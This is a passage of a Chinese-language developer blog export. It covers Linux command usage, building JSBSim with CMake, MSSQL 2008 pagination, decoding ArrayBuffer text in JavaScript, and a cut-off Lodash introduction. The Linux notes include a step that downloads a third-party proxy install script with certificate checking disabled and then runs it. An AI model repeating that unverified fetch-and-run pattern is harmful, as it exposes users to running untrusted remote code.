<li><a href="https://juejin.cn/post/6844903577077415950" target="_blank" rel="noopener">Spring MVC 解析之 DispatcherServlet</a>,by 摆码王子.</li>
<li><a href="https://www.jianshu.com/p/4851dbedb63d" target="_blank" rel="noopener">一文读懂SpringMVC工作流程</a>,by Wizey.</li>
<li><a href="https://www.cnblogs.com/51kata/p/5152400.html" target="_blank" rel="noopener">servlet的url-pattern匹配规则详细描述</a>,by 51kata.</li>
<li><a href="https://blog.51cto.com/u_3664660/3216490" target="_blank" rel="noopener">Listener,Filter,Servlet执行顺序和生命周期</a>,by laolu0837.</li>
<li><a href="https://blog.csdn.net/u012373815/article/details/47174163" target="_blank" rel="noopener">springmvc 的参数绑定，springmvc和 struts2的区别</a>,by 双斜杠少年.</li>
<li><a href="https://www.51cto.com/article/130441.html" target="_blank" rel="noopener">如何集成Struts和Spring</a>,by gxhsnowflower.</li>
<li><a href="https://www.yiibai.com/struts_2/struts_spring.html" target="_blank" rel="noopener">Struts2和Spring集成</a>,by yiibai.</li>
<li><a href="https://blog.csdn.net/wrs120/article/details/79603735" target="_blank" rel="noopener">Spring 和 Struts 集成</a>,by 王如霜.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux常用命令用法总结</title>
    <url>/2018/11/01/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>记录一些常用的linux命令用法，以备查询。</p>
<h1 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h1><h2 id="校验文件"><a href="#校验文件" class="headerlink" title="校验文件"></a>校验文件</h2><p>下载的文件最好校验完整性，防止被人篡改。以sha256sum为例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 以下命令将生成树莓派映像的sha256哈希码，从树莓派官网复制该映像sha256哈希码，以便校验。</span><br><span class="line"># 当然通常应该会提供映像的哈希码校验文件。</span><br><span class="line"></span><br><span class="line">sha256sum 2018-10-09-raspbian-stretch.zip &gt;2018-10-09-raspbian-stretch.zip.sha256sum</span><br><span class="line"></span><br><span class="line"># 使用下面校验文件的完整性，如果成功则映像与官方一致，未被篡改。</span><br><span class="line"># 注意被校验文件与校验文件应放在同一个目录。</span><br><span class="line"></span><br><span class="line">sha256sum -c 2018-10-09-raspbian-stretch.zip.sha256sum</span><br></pre></td></tr></table></figure>

<h2 id="转换和复制文件命令"><a href="#转换和复制文件命令" class="headerlink" title="转换和复制文件命令"></a>转换和复制文件命令</h2><p>Linux的dd命令用于复制文件并对原文件的内容进行转换和格式化处理。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">读指定物理扇区：</span><br><span class="line">dd  if&#x3D;&lt;源设备&gt;  of&#x3D;&lt;输出设备或文件&gt;   skip&#x3D;&lt;指定扇区值&gt;  bs&#x3D;512 count&#x3D;1</span><br><span class="line"></span><br><span class="line">写指定物理扇区：</span><br><span class="line">dd   if&#x3D;&lt;输入设备或文件&gt;   of&#x3D;&lt;输出设备&gt;   seek&#x3D;&lt;指定扇区值&gt;  bs&#x3D;512 count&#x3D;1</span><br><span class="line"></span><br><span class="line">读取sd启动扇区示例：</span><br><span class="line">dd if&#x3D;&#x2F;dev&#x2F;mmcblk0 of&#x3D;mbrsd.data bs&#x3D;512 count&#x3D;1</span><br><span class="line"></span><br><span class="line">制作光盘iso镜像</span><br><span class="line">dd if&#x3D;&#x2F;dev&#x2F;cdrom of&#x3D;&#x2F;home&#x2F;hch&#x2F;drone.iso status&#x3D;progress conv&#x3D;fsync</span><br></pre></td></tr></table></figure>

<h2 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># find基本语法：find [PATH] [option] [action]</span><br><span class="line"></span><br><span class="line">find &#x2F;usr&#x2F;lib -name libQt5Xml.so</span><br><span class="line"># 使用通配符</span><br><span class="line">find &#x2F;usr&#x2F;lib -name &quot;*ssl*&quot;</span><br></pre></td></tr></table></figure>

<h2 id="查找文件内容"><a href="#查找文件内容" class="headerlink" title="查找文件内容"></a>查找文件内容</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># grep基本用法：</span><br><span class="line">grep &quot;let&#39;s find something&quot; file.[txt,json,js,md,etc]</span><br><span class="line"></span><br><span class="line"># 大小写不敏感搜索</span><br><span class="line">grep -i &quot;REact&quot; compiler&#x2F;apps&#x2F;playground&#x2F;app&#x2F;index.tsx</span><br><span class="line">grep -i &quot;Operation not supported on socket&quot; system.log</span><br><span class="line"></span><br><span class="line"># 多模式搜索</span><br><span class="line">grep -e &quot;error&quot; -e &quot;404&quot; system.log</span><br><span class="line"></span><br><span class="line"># 统计字符串匹配次数</span><br><span class="line">grep -c &quot;React&quot; compiler&#x2F;apps&#x2F;playground&#x2F;app&#x2F;index.tsx</span><br><span class="line"></span><br><span class="line"># 文件夹递归搜索，-o 仅输出匹配行，-r 递归搜索目录及其子目录</span><br><span class="line">grep -o -r &quot;fs&quot; node_modules | wc -l</span><br></pre></td></tr></table></figure>

<h2 id="批量处理指定文件"><a href="#批量处理指定文件" class="headerlink" title="批量处理指定文件"></a>批量处理指定文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Find all .txt files and delete them</span><br><span class="line">find . -name &quot;*.txt&quot; | xargs rm</span><br><span class="line"></span><br><span class="line"># Creates each directory listed in the file.</span><br><span class="line">cat dirs.txt | xargs mkdir</span><br><span class="line"></span><br><span class="line"># Compresses all .log files in the current directory</span><br><span class="line">ls *.log | xargs gzip</span><br></pre></td></tr></table></figure>

<h2 id="批量转换文件格式"><a href="#批量转换文件格式" class="headerlink" title="批量转换文件格式"></a>批量转换文件格式</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 将png格式图像转换为jpg</span><br><span class="line"># -1 – 告诉 ls 每行列出一个图像名称的选项标识</span><br><span class="line"># -n – 指定最多参数个数，例子中为 1</span><br><span class="line"># -c – 指示 bash 运行给定的命令</span><br><span class="line"># $&#123;0%.png&#125;.jpg – 设置新转换的图像文件的名字，% 符号用来删除源文件的扩展名</span><br><span class="line"></span><br><span class="line">ls -1 *.png | xargs -n 1 bash -c &#39;convert &quot;$0&quot; &quot;$&#123;0%.png&#125;.jpg&quot;&#39;</span><br></pre></td></tr></table></figure>

<h2 id="终端下载"><a href="#终端下载" class="headerlink" title="终端下载"></a>终端下载</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 逐条下载uri.txt文件中每一行uri</span><br><span class="line">wget -i uri.txt</span><br><span class="line"></span><br><span class="line"># 跳过前1000条再下载</span><br><span class="line">awk &#39;NR&gt;&#x3D;1000&#39; url.txt | wget -i -</span><br><span class="line"></span><br><span class="line"># install proxy</span><br><span class="line">wget --no-check-certificate https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;jwchenzju&#x2F;teddysunss&#x2F;master&#x2F;shadowsocks.sh</span><br><span class="line"></span><br><span class="line">chmod +x shadowsocks.sh</span><br><span class="line"></span><br><span class="line">.&#x2F;shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</span><br></pre></td></tr></table></figure>

<h2 id="终端中打开文件管理器"><a href="#终端中打开文件管理器" class="headerlink" title="终端中打开文件管理器"></a>终端中打开文件管理器</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用gnome文件管理器打开当前文件夹</span><br><span class="line">nautilus .&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="统计"><a href="#统计" class="headerlink" title="统计"></a>统计</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 统计文件行数</span><br><span class="line">wc -l file</span><br><span class="line"></span><br><span class="line">统计某文件夹下文件的个数</span><br><span class="line">ls -l |grep &quot;^-&quot;|wc -l</span><br><span class="line"></span><br><span class="line">统计某文件夹下目录的个数</span><br><span class="line">ls -l |grep &quot;^ｄ&quot;|wc -l</span><br><span class="line"></span><br><span class="line">统计文件夹下文件的个数，包括子文件夹里的</span><br><span class="line">ls -lR|grep &quot;^-&quot;|wc -l</span><br><span class="line"></span><br><span class="line"># 统计文件或文件夹大小</span><br><span class="line">du -a -h -d 1 .&#x2F;</span><br><span class="line"></span><br><span class="line"># 统计文件状态信息</span><br><span class="line">stat file.txt</span><br></pre></td></tr></table></figure>

<h2 id="压缩和解压文件"><a href="#压缩和解压文件" class="headerlink" title="压缩和解压文件"></a>压缩和解压文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># tar命令</span><br><span class="line">tar zxvf FileName.tar #解压</span><br><span class="line">tar czvf FileName.tar DirName #压缩</span><br><span class="line"></span><br><span class="line"># zip命令</span><br><span class="line">unzip FileName.zip #解压</span><br><span class="line">zip -r FileName.zip DirName #压缩</span><br></pre></td></tr></table></figure>

<h2 id="SSH-连接、远程上传下载文件"><a href="#SSH-连接、远程上传下载文件" class="headerlink" title="SSH 连接、远程上传下载文件"></a>SSH 连接、远程上传下载文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># SSH 远程登入 Ubuntu 机 </span><br><span class="line">ssh username@192.168.0.1</span><br><span class="line"></span><br><span class="line"># 将 文件&#x2F;文件夹 从远程 Ubuntu 机拷至本地(scp) </span><br><span class="line">scp -r username@192.168.0.1:&#x2F;home&#x2F;username&#x2F;remotefile.txt remotefile.txt</span><br><span class="line"></span><br><span class="line"># 将 文件&#x2F;文件夹 从本地拷至远程 Ubuntu 机(scp) </span><br><span class="line">scp -r localfile.txt username@192.168.0.1:&#x2F;home&#x2F;username&#x2F;</span><br><span class="line"></span><br><span class="line"># rsync大文件断电续传，远程服务器需安装rsync</span><br><span class="line">rsync -P --rsh&#x3D;ssh  root@192.168.0.1:&#x2F;root&#x2F;fgdata.tar fgdata.tar</span><br></pre></td></tr></table></figure>

<h1 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h1><h2 id="修改用户"><a href="#修改用户" class="headerlink" title="修改用户"></a>修改用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 将用户$USER添加到dialout用户组，以获取串口访问权限</span><br><span class="line">sudo usermod -a -G dialout $USER</span><br></pre></td></tr></table></figure>

<h2 id="特殊符号用法"><a href="#特殊符号用法" class="headerlink" title="特殊符号用法"></a>特殊符号用法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#| 管道 (pipeline)，是 UNIX 系统，基础且重要的观念。连结上个指令的标准输出，做为下个指令的标准输入。</span><br><span class="line">who | wc -l</span><br><span class="line"></span><br><span class="line">#! 惊叹号(negate or reverse)，通常它代表反逻辑的作用，譬如条件侦测中，用 !&#x3D; 来代表&quot;不等于&quot;</span><br><span class="line">#下例代表显示除了a0, a1 .... a9 这几个文件的其他文件。</span><br><span class="line">ls a[!0-9]</span><br><span class="line"></span><br><span class="line">#&amp; 后台工作，单一个&amp; 符号，且放在完整指令列的最后端，即表示将该指令列放入后台中工作。</span><br><span class="line">tar cvfz data.tar.gz data &gt; &#x2F;dev&#x2F;null &amp;</span><br></pre></td></tr></table></figure>

<h2 id="系统服务管理"><a href="#系统服务管理" class="headerlink" title="系统服务管理"></a>系统服务管理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># service命令用于对系统服务进行管理，比如启动（start）、停止（stop）、重启（restart）、查看状态（status）等。</span><br><span class="line"># service命令本身是一个shell脚本，它在&#x2F;etc&#x2F;init.d&#x2F;目录查找指定的服务脚本，然后调用该服务脚本来完成任务。</span><br><span class="line"></span><br><span class="line"># 查看系统所有服务状态</span><br><span class="line">service --status-all</span><br></pre></td></tr></table></figure>

<h2 id="查询本机公网IP"><a href="#查询本机公网IP" class="headerlink" title="查询本机公网IP"></a>查询本机公网IP</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl ifconfig.me</span><br><span class="line">curl ipinfo.io</span><br></pre></td></tr></table></figure>

<h2 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export</span><br></pre></td></tr></table></figure>

<h2 id="查看端口占用情况"><a href="#查看端口占用情况" class="headerlink" title="查看端口占用情况"></a>查看端口占用情况</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsof -i:8080：查看8080端口占用</span><br><span class="line"></span><br><span class="line">netstat -tunlp | grep 端口号</span><br><span class="line">-t (tcp) 仅显示tcp相关选项</span><br><span class="line">-u (udp)仅显示udp相关选项</span><br><span class="line">-n 拒绝显示别名，能显示数字的全部转化为数字</span><br><span class="line">-l 仅列出在Listen(监听)的服务状态</span><br><span class="line">-p 显示建立相关链接的程序名</span><br></pre></td></tr></table></figure>

<h2 id="Vim使用方法"><a href="#Vim使用方法" class="headerlink" title="Vim使用方法"></a>Vim使用方法</h2><ul>
<li>正向搜索字符串</li>
</ul>
<p>在普通模式下，按下 / 键，然后输入你要查找的字符串，最后按下 Enter 键。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;function</span><br></pre></td></tr></table></figure>

<ul>
<li>反向搜索字符串</li>
</ul>
<p>与正向查找相似，使用 ? 键进行反向查找。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?error</span><br></pre></td></tr></table></figure>

<ul>
<li>替换字符串</li>
</ul>
<p>在命令模式下，替换字符串。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:%s&#x2F;apple&#x2F;orange&#x2F;gc</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/ljianhui/article/details/11100625" target="_blank" rel="noopener">初窥Linux 之 我最常用的20条命令</a>,by ljianhui.</li>
<li><a href="http://www.ruanyifeng.com/blog/2009/10/5_ways_to_search_for_files_using_the_terminal.html" target="_blank" rel="noopener">Linux的五个查找命令</a>,by 阮一峰.</li>
<li><a href="https://www.cnblogs.com/xuxm2007/archive/2011/10/20/2218846.html" target="_blank" rel="noopener">shell脚本中一些特殊符号</a>, by 阿笨猫.</li>
<li><a href="https://medium.com/@zoomyale/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E7%9A%84%E7%BB%88%E6%9E%81%E5%A7%BF%E5%8A%BF-%E5%9C%A8-vultr-vps-%E4%B8%8A%E6%90%AD%E5%BB%BA-shadowsocks-fd57c807d97e" target="_blank" rel="noopener">vultr proxy</a></li>
<li><a href="https://einverne.github.io/post/2017/02/terminal-sock5-proxy.html" target="_blank" rel="noopener">proxychains配置</a>,by Verne.</li>
<li><a href="https://www.trevorlasn.com/blog/10-essential-terminal-commands-every-developer-should-know" target="_blank" rel="noopener">10 Essential Terminal Commands Every Developer Should Know</a>,by Trevor I. Lasn.</li>
<li><a href="https://www.quanxiaoha.com/vim-command/vim-find-string.html" target="_blank" rel="noopener">Vim 查找字符串（超详细）</a>,by quanxiaoha.</li>
</ol>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux平台编译安装测试JSBSim</title>
    <url>/2019/03/20/Linux%E5%B9%B3%E5%8F%B0%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%B5%8B%E8%AF%95JSBSim/</url>
    <content><![CDATA[<p>JSBSim是一个开源跨平台的飞行动力学模型（FDM）软件库，用于模拟航空航天飞行器的飞行动力学。 该库已被纳入飞行模拟软件包FlightGear和OpenEaagles。 它也可以从一个小型独立程序调用，以创建批处理模拟工具。 JSBSim是用C ++编写的，使用XML配置文件。下面介绍如何在Linux平台编译按照测试JSBSim。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h2><p>代码变成可执行文件，叫做编译（compile）；先编译这个，还是先编译那个（即编译的安排），叫做构建（build）。</p>
<p>Make是最常用的构建工具，诞生于1977年，主要用于C语言的项目。但是实际上 ，任何只要某个文件有变化，就要重新构建的项目，都可以用Make构建。</p>
<p>Make工具有很多，例如 GNU Make ，QT 的 qmake ，微软的 MS nmake，BSD Make（pmake），Makepp，等等。这些 Make 工具遵循着不同的规范和标准，所执行的 Makefile 格式也千差万别。这样就带来了一个严峻的问题：如果软件想跨平台，必须要保证能够在不同平台编译。而如果使用上面的 Make 工具，就得为每一种标准写一次 Makefile ，这将是一件让人抓狂的工作。</p>
<p>CMake就是针对上面问题所设计的工具：它首先允许开发者编写一种平台无关的 CMakeList.txt 文件来定制整个编译流程，然后再根据目标用户的平台进一步生成所需的本地化 Makefile 和工程文件，如 Unix 的 Makefile 或 Windows 的 Visual Studio 工程。从而做到“Write once, run everywhere”。显然，CMake 是一个比上述几种 make 更高级的编译配置工具。一些使用 CMake 作为项目架构系统的知名开源项目有 VTK、ITK、KDE、OpenCV、OSG 等。</p>
<p>在 linux 平台下使用 CMake 生成 Makefile 并编译的流程如下：</p>
<ol>
<li>编写 CMake 配置文件 CMakeLists.txt 。</li>
<li>执行命令 cmake PATH 或者 ccmake PATH 生成 Makefile。其中， PATH 是 CMakeLists.txt 所在的目录。</li>
<li>使用 make 命令进行编译。</li>
</ol>
<h1 id="编译JSBSim"><a href="#编译JSBSim" class="headerlink" title="编译JSBSim"></a>编译JSBSim</h1><h2 id="下载JSBSim源代码"><a href="#下载JSBSim源代码" class="headerlink" title="下载JSBSim源代码"></a>下载JSBSim源代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;JSBSim-Team&#x2F;jsbsim.git</span><br></pre></td></tr></table></figure>

<h2 id="编译JSBSim-1"><a href="#编译JSBSim-1" class="headerlink" title="编译JSBSim"></a>编译JSBSim</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 跳转到jsbsim源码目录</span><br><span class="line">cd jsbsim  </span><br><span class="line"># 创建build文件夹用于编译jsbsim</span><br><span class="line">mkdir build </span><br><span class="line">cd build</span><br><span class="line"># 生成Makefile文件</span><br><span class="line">cmake .. </span><br><span class="line"># 编译</span><br><span class="line">make </span><br><span class="line"># 编译完成后跳转到jsbsim所在目录测试</span><br><span class="line">cd src</span><br><span class="line">.&#x2F;jsbsim</span><br></pre></td></tr></table></figure>

<h1 id="测试jsbsim"><a href="#测试jsbsim" class="headerlink" title="测试jsbsim"></a>测试jsbsim</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 跳转到jsbsim源码目录</span><br><span class="line">cd jsbsim </span><br><span class="line"># 测试jsbsim</span><br><span class="line">.&#x2F;build&#x2F;src&#x2F;JSBSim scripts&#x2F;c1723.xml</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://en.wikipedia.org/wiki/JSBSim" target="_blank" rel="noopener">JSBSim</a>, by wikipedia.</li>
<li><a href="http://www.ruanyifeng.com/blog/2015/02/make.html" target="_blank" rel="noopener">Make 命令教程</a>,by 阮一峰</li>
<li><a href="https://www.hahack.com/codes/cmake/" target="_blank" rel="noopener">CMake 入门实战</a>,by hahack.</li>
<li><a href="https://blog.csdn.net/yu_lei_/article/details/81813203" target="_blank" rel="noopener">JSBSim使用教程</a>, by  32768.</li>
<li><a href="https://www.cnblogs.com/binbinjx/p/5626916.html" target="_blank" rel="noopener">cmake 添加头文件目录，链接动态、静态库</a>,by 王彬彬.</li>
<li><a href="https://blog.csdn.net/10km/article/details/51711907" target="_blank" rel="noopener">cmake:install制作简单的安装脚本</a>,by 10km.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>MSSQL2008中分页查询的实现</title>
    <url>/2019/08/17/MSSQL2008%E4%B8%AD%E5%88%86%E9%A1%B5%E6%9F%A5%E8%AF%A2%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>在后台管理中，涉及分页操作，需要数据库支持limit和offset选项，但在MSSQL2008中这两个选项不支持，不过可以用ROW_NUMBER函数在SQL语句中实现数据分页效果。SQL代码示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM  </span><br><span class="line">(SELECT Users.id as id,name,sign,account,audit,roleName,RoleId, Users.deleteFlag as deleteFlag,</span><br><span class="line">ROW_NUMBER() OVER (ORDER BY Users.createdAt) AS Seq </span><br><span class="line">FROM Users LEFT JOIN Roles ON Users.RoleId&#x3D;Roles.id)Users </span><br><span class="line">Where deleteFlag&#x3D;0 and </span><br><span class="line">Seq &gt; :offset_num and Seq&lt;&#x3D; :offset_num+:limit_num</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://social.msdn.microsoft.com/Forums/sqlserver/en-US/f24c0a3d-e8e9-4041-aca5-590a6e1a2e81/how-to-use-offset-fetch-next-in-sql-server-2008-r2?forum=databasedesign" target="_blank" rel="noopener">How to use Offset . . .Fetch Next in SQL SERVER 2008 R2</a>,by microsoft msdn.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>JS如何从ArrayBuffer中解码字符串</title>
    <url>/2019/09/24/JS%E5%A6%82%E4%BD%95%E4%BB%8EArrayBuffer%E4%B8%AD%E8%A7%A3%E7%A0%81%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<p>最近遇到一个问题，拿到一个ArrayBuffer，知道它是以gb2312编码的文档，那么如何使用javascript从中解码出字符串。下面介绍常用的解决方案。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h2><p>字符编码（英语：Character encoding）、字集码是把字符集中的字符编码为指定集合中某一对象（例如：比特模式、自然数序列、8位组或者电脉冲），以便文本在计算机中存储和通过通信网络的传递。常见的例子包括将拉丁字母表编码成摩斯电码和ASCII。其中，ASCII将字母、数字和其它符号编号，并用7比特的二进制来表示这个整数。通常会额外使用一个扩充的比特，以便于以1个字节的方式存储。</p>
<p>因此，如果不知道字符存储的编码方案，那么只能得到一堆无意义的数字，无法从中解码出正确的字符信息。</p>
<h2 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h2><p>ArrayBuffer对象、TypedArray对象、DataView对象是JavaScript操作二进制数据的一个接口。这些对象早就存在，属于独立的规格，ES6将它们纳入了ECMAScript规格，并且增加了新的方法。</p>
<p>这些对象原始的设计目的，与WebGL项目有关。所谓WebGL，就是指浏览器与显卡之间的通信接口，为了满足JavaScript与显卡之间大量的、实时的数据交换，它们之间的数据通信必须是二进制的，而不能是传统的文本格式。文本格式传递一个32位整数，两端的JavaScript脚本与显卡都要进行格式转化，将非常耗时。这时要是存在一种机制，可以像C语言那样，直接操作字节，将4个字节的32位整数，以二进制形式原封不动地送入显卡，脚本的性能就会大幅提升。</p>
<p>二进制数组就是在这种背景下诞生的。它很像C语言的数组，允许开发者以数组下标的形式，直接操作内存，大大增强了JavaScript处理二进制数据的能力，使得开发者有可能通过JavaScript与操作系统的原生接口进行二进制通信。</p>
<p>二进制数组由三个对象组成。</p>
<ul>
<li><p>ArrayBuffer对象：代表内存之中的一段二进制数据，可以通过“视图”进行操作。“视图”部署了数组接口，这意味着，可以用数组的方法操作内存。</p>
</li>
<li><p>TypedArray对象：用来生成内存的视图，通过9个构造函数，可以生成9种数据格式的视图，比如Uint8Array（无符号8位整数）数组视图, Int16Array（16位整数）数组视图, Float32Array（32位浮点数）数组视图等等。</p>
</li>
<li><p>DataView对象：用来生成内存的视图，可以自定义格式和字节序，比如第一个字节是Uint8（无符号8位整数）、第二个字节是Int16（16位整数）、第三个字节是Float32（32位浮点数）等等。</p>
</li>
</ul>
<p>简单说，ArrayBuffer对象代表原始的二进制数据，TypedArray对象代表确定类型的二进制数据，DataView对象代表不确定类型的二进制数据。它们支持的数据类型一共有9种（DataView对象支持除Uint8C以外的其他8种）。</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="UTF-16的编码解码"><a href="#UTF-16的编码解码" class="headerlink" title="UTF-16的编码解码"></a>UTF-16的编码解码</h2><p>下面的解决方案只能解码UTF-16编码的字符串，而且当ArrayBuffer的长度过大时，会报“ Maximum call stack size exceeded”的错误。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function ab2str(buf) &#123;</span><br><span class="line">  return String.fromCharCode.apply(null, new Uint16Array(buf));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function str2ab(str) &#123;</span><br><span class="line">  var buf &#x3D; new ArrayBuffer(str.length*2); &#x2F;&#x2F; 2 bytes for each char</span><br><span class="line">  var bufView &#x3D; new Uint16Array(buf);</span><br><span class="line">  for (var i&#x3D;0, strLen&#x3D;str.length; i &lt; strLen; i++) &#123;</span><br><span class="line">    bufView[i] &#x3D; str.charCodeAt(i);</span><br><span class="line">  &#125;</span><br><span class="line">  return buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="gb2312解码"><a href="#gb2312解码" class="headerlink" title="gb2312解码"></a>gb2312解码</h2><p>下面的解决方案能解码指定编码的字符串，包括utf-8，utf-16, iso-8859-2, koi8, cp1261, and gbk等。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function ab2str(arrayBuf, encodeType) &#123;</span><br><span class="line">  var decoder &#x3D; new TextDecoder(encodeType)</span><br><span class="line">  var u8arr &#x3D; new Uint8Array(arrayBuf)</span><br><span class="line">  return decoder.decode(u8arr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://developers.google.com/web/updates/2012/06/How-to-convert-ArrayBuffer-to-and-from-String" target="_blank" rel="noopener">How to convert ArrayBuffer to and from String</a>,by Renato Mangini.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81" target="_blank" rel="noopener">字符编码</a>,by wikipedia.</li>
<li><a href="https://stackoverflow.com/questions/38432611/converting-arraybuffer-to-string-maximum-call-stack-size-exceeded" target="_blank" rel="noopener">Converting arraybuffer to string : Maximum call stack size exceeded</a>,by stackoverflow.</li>
<li><a href="https://stackoverflow.com/questions/22123769/rangeerror-maximum-call-stack-size-exceeded-why" target="_blank" rel="noopener">“RangeError: Maximum call stack size exceeded” Why?</a>,by stackoverflow.</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/TextDecoder" target="_blank" rel="noopener">TextDecoder</a>,by mozilla.</li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode" target="_blank" rel="noopener">String.fromCharCode()</a>,by mozilla.</li>
<li><a href="https://javascript.ruanyifeng.com/stdlib/arraybuffer.html" target="_blank" rel="noopener">二进制数组</a>,by 阮一峰.</li>
<li><a href="http://es6.ruanyifeng.com/#docs/arraybuffer" target="_blank" rel="noopener">ArrayBuffer</a>,by 阮一峰.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Lodash入门简介</title>
    <url>/2019/07/25/Lodash%E5%85%A5%E9%97%A8%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>Lodash是一个一致性、模块化、高性能的 JavaScript 实用工具库。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>浏览器环境：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;lodash.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>通过 npm：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm i -g npm</span><br><span class="line">$ npm i --save lodash</span><br></pre></td></tr></table></figure>

<p>Node.js：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Load the full build.</span><br><span class="line">var _ &#x3D; require(&#39;lodash&#39;);</span><br><span class="line">&#x2F;&#x2F; Load the core build.</span><br><span class="line">var _ &#x3D; require(&#39;lodash&#x2F;core&#39;);</span><br><span class="line">&#x2F;&#x2F; Load the FP build for immutable auto-curried iteratee-first data-last methods.</span><br><span class="line">var fp &#x3D; require(&#39;lodash&#x2F;fp&#39;);</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; Load method categories.</span><br><span class="line">var array &#x3D; require(&#39;lodash&#x2F;array&#39;);</span><br><span class="line">var object &#x3D; require(&#39;lodash&#x2F;fp&#x2F;object&#39;);</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; Cherry-pick methods for smaller browserify&#x2F;rollup&#x2F;webpack bundles.</span><br><span class="line">var at &#x3D; require(&#39;lodash&#x2F;at&#39;);</span><br><span class="line">var curryN &#x3D; require(&#39;lodash&#x2F;fp&#x2F;curryN&#39;);</span><br></pre></td></tr></table></figure>

<h1 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h1><p>Lodash 通过降低 array、number、objects、string 等等的使用难度从而让 JavaScript 变得更简单。</p>
<p>Lodash 的模块化方法 非常适用于：</p>
<ul>
